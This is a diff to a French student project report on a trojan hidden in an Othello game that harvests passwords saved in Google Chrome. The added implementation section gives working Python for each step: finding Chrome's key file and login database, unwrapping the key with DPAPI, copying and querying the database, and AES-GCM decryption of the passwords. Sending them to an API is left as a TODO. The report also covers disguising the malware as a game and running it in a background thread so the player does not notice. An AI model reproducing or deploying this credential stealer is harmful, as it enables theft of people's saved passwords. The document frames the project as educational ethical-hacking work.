@@ -26,7 +26,7 @@ Cette méthode d'intrusion dans un système est largement utilisée par les Ethi
 
 Un cheval de Troie peut être écrit dans n'importe quel language de programmation mais il est plus facile de le faire en C/C++ afin de bypasser les permissions.
 
-Voici quelques exemples de cheval de Troie :
+Voici un exemple de cheval de Troie :
 
 ### Troyen dans un fichier jpg ou autre fichier
 
@@ -34,19 +34,114 @@ Il semble très facile de mettre en place un Troyen dans un fichier jpg d'après
 
 Lien sur son post : https://infosecwriteups.com/how-i-created-a-trojan-malware-ethical-hacking-82239a6b64c6
 
-### Troyen dans un 
-
 ## Mise en place concrète
 
-Nous avons commencé par établir un but, un certain type de données que nous voudrions récupérer. Nous avons choisi les mots de passes car c'est généralement des données difficiles à obtenir et donc intéréssant à implémenter. Nous avons eu vent de la possibilité de récupérer les mots de passes en clair de personnes possédant des mots de passe enregistré sur google chrome. Cette informations nous vient du lien suivant : https://techbrowser.co/browser/google-chrome/where-are-google-chrome-passwords-stored/.
+Nous avons commencé par établir un but, un certain type de données que nous voulions récupérer. Nous avons choisi les mots de passes car c'est généralement des données difficiles à obtenir et donc intéréssant à implémenter. Nous avons eu vent de la possibilité de récupérer les mots de passes en clair de personnes possédant des mots de passe enregistré sur google chrome. Cette informations nous vient du lien suivant : https://techbrowser.co/browser/google-chrome/where-are-google-chrome-passwords-stored/.
 
-Par la suite, nous avons creusé dans cette direction en nous renseignant par le biais de diverses sources citées plus bas dans les références.
+### Social engineering
+
+Une des facettes de ce genre d'attaque est le social engineering. Nous avons choisi d'intégrer notre troyen dans un jeu. Il y a deux raisons à celà.
+
+Premièrement, parce que nous avions déjà un jeu développé dans le cadre de la HE-Arc en python et que c'était donc facile à intégrer et tester rapidement le bon fonctionnement de notre troyen.
+
+Mais c'est aussi une couverture tout à fait crédible étant donné qu'on peut facilement publier un jeu sans trop de vérification.
+
+### Implémentation
+
+Pour ce qui est de l'implémentation de notre troyen, nous n'avions qu'à récupérer la base de données locale contenant nos identifiants et mot de passe chiffrés pour ensuite les déchiffrer avec un clé stockée en local elle aussi. Cependant, nous ne connaissions pas l'algorithme de chiffrement utilisé ni comment le déchiffrer avec la clé. C'est pourquoi nous avons fait de nombreuses recherche à ce sujet. Tous les sites que nous avons visités sont cités dans la partie références de notre rapport.
+
+Par la suite, nous avons rassemblé les différents bouts de code trouvé sur divers sites et voici les étapes que nous avons effectuée pour déchiffrer les mots de passe :
+
+1. Trouvez le chemin d'accès à la base de données locale contenant les données avec des mots de passe chiffrés et le chemin d'accès au fichier contenant la clé de déchiffrement aussi stocké en local.
+
+```python
+# Fichier contenant la clé
+CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
+
+# Dossier contenant la base de donnée
+CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
+```
+
+2. Récupérer la clé de déchiffrement
+
+```python
+# Obtenir la secretkey du fichier local state de chrome
+with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
+    local_state = f.read()
+    local_state = json.loads(local_state)
+
+secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+
+# Supprimer le suffixe DPAPI
+secret_key = secret_key[5:] 
+secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
+
+return secret_key
+```
+
+3. Extraire les données de la base de données
+
+```python
+chrome_path_login_db = CHROME_PATH + r"\Default\Login Data"
+        
+shutil.copy2(chrome_path_login_db, "Loginvault.db") 
+
+# Connexion à la base de données sqlite
+conn = sqlite3.connect("Loginvault.db")
+cursor = conn.cursor()
+
+# Requête SQL pour obtenir les données qui nous intéressent
+cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+
+data = []
+
+for index, login in enumerate(cursor.fetchall()):
+    url = login[0]
+    username = login[1]
+    ciphertext= login[2]
+    
+    data.append((url, username, ciphertext))
+    
+return data
+```
+
+4. Déchiffrement des mots de passes
+
+```python
+def decrypt(ciphertext, secret_key):
+    # Étape 1: Extraction du vecteur d'initilisation du ciphertext
+    initialisation_vector = ciphertext[3:15]
+        
+    # Étape 2: Extraction du mot de passe chiffré du ciphertext
+    encrypted_password = ciphertext[15:-16]
+        
+    # Étape 3: Déchiffrer le mot de passe à l'aide de AES et de la clé secrète
+    cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
+    decrypted_pass = cipher.decrypt(encrypted_password)
+    decrypted_pass = decrypted_pass.decode()
+
+    return decrypted_pass
+```
+
+5. Envoi des mots de passe à une API
+
+```python
+# TODO
+```
+
+6. Affichage des mots de passe sur un frontend
+
+```python
+# TODO
+```
 
 ## Résultats
 
-Notre troyen est dissumulé dans un jeu de plateau informatisé qui s'appelle othello. Lorsque le jeu démarre sur la machine de notre cible, s'il possède des mots de passe dans google chrome, nous parvenons à les récupérer et les envoyer à une api pour concentrer les mots de passes récupéré à un unique endroit. 
+Notre troyen est dissumulé dans un jeu de plateau informatisé qui s'appelle othello. Lorsque le jeu démarre sur la machine de notre cible, s'il possède des mots de passe dans google chrome, nous parvenons à les récupérer et les envoyer à une api pour concentrer les mots de passes récupéré à un unique endroit. Par la suite, un frontend permet de visualiser les mots de passe collecté.
 
-Notre troyen n'est pour l'instant pas particulièrement discret. 
+Pour des raisons évidentes de confidentialité, cette application n'est pas déployée et ne focntionne qu'en local afin d'éviter que ces mots de passe soient réellement publié.
+
+Notre troyen n'est pour l'instant pas particulièrement discret. Nous n'avons pas cherché à optimiser cette partie. Cependant, il est efficace et démarre dans un thread différent du jeu dans lequel il est divulgué pour ne pas ralentir l'exécution du jeu et attirer l'attention du joueur.
 
 ## Références
 
